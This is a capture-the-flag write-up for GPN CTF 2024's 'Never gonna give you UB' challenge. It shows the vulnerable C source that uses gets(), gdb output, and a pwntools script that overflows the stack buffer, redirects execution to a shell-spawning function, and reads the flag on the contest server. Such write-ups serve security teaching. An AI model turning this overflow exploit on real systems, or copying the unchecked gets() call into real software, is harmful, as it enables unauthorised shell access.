# Never gonna give you UB

## Description
```
Can you get this program to do what you want?
```

## Provided Files
```
- Dockerfile
- run.sh
- song_rather.c
- song_rather
```

## Writeup

Starting off, we should inspect the given `song_rather.c`. <br/>
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void scratched_record() {
	printf("Oh no, your record seems scratched :(\n");
	printf("Here's a shell, maybe you can fix it:\n");
	execve("/bin/sh", NULL, NULL);
}

extern char *gets(char *s);

int main() {
	printf("Song rater v0.1\n-------------------\n\n");
	char buf[0xff];
	printf("Please enter your song:\n");
	gets(buf);
	printf("\"%s\" is an excellent choice!\n", buf);
	return 0;
}
```
The important part to notice in the source code is the vulnerable function `gets(buf)`. <br/>
Because `gets(buf)` doesn't perform `bounds checking` we can simply overflow the buffer and overwrite the `return address` with the address of `scratched_record()` function which spawns a shell. <br/>
Getting the right memory-address of `scratched_record()` functions using `gdb`. <br/>
```sh
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401070  puts@plt
0x0000000000401080  printf@plt
0x0000000000401090  execve@plt
0x00000000004010a0  gets@plt
0x00000000004010b0  _start
0x00000000004010e0  _dl_relocate_static_pie
0x00000000004010f0  deregister_tm_clones
0x0000000000401120  register_tm_clones
0x0000000000401160  __do_global_dtors_aux
0x0000000000401190  frame_dummy
0x0000000000401196  scratched_record        # This is the important one
0x00000000004011d8  main
0x000000000040123c  _fini
```

To get the correct `offset` for our exploit we can convert the buffer size `[0xff]` from hex to decimal which would be `255` and add the `8` bytes of `EBP` which results in our `offset` being at `263` (+1). <br/>
Knowng all things we can put together an exploit using `pwntools` in python. <br/>
```py
from pwn import *

# Memory-Address of 'scratched_record' function
scratched_record_addr = 0x0000000000401196

# Offset to the return address
offset = 264 

payload = b"A" * offset
payload += p64(scratched_record_addr)

p = remote("cool-for-the-summer--demi-lovato-8984.ctf.kitctf.de", "443", ssl=True)

p.sendline(payload)

# Set interactive shell
p.interactive()
```

Running the exploit returns a shell and the flag which concludes this writeup. <br/>
```sh
$ python3 solve.py 
[!] Could not populate PLT: No module named 'distutils'
[*] '/home/aryt3/Hacking/CTFs/GPN_ctf_2024/Never_gonna_give_you_UB/never-gonna-give-you-ub/song_rater'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to cool-for-the-summer--demi-lovato-8984.ctf.kitctf.de on port 443: Done
[*] Switching to interactive mode
Song rater v0.1
-------------------

Please enter your song:
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x96\x11@" is an excellent choice!
Oh no, your record seems scratched :(
Here's a shell, maybe you can fix it:
$ ls -la
total 24
dr-xr-xr-x   1 root root    28 May 31 14:04 .
dr-xr-xr-x   1 root root    28 May 31 14:04 ..
lrwxrwxrwx   1 root root     7 Apr 22 13:08 bin -> usr/bin
drwxr-xr-x   2 root root     6 Apr 22 13:08 boot
drwxr-xr-x   5 root root   360 May 31 14:04 dev
drwxr-xr-x   1 root root    18 May 31 14:04 etc
-rw-r--r--   1 root root    59 May 30 10:08 flag
-------------

$ cat flag
GPNCTF{G00d_n3w5!_1t_l00ks_l1ke_y0u_r3p41r3d_y0ur_disk...}
```

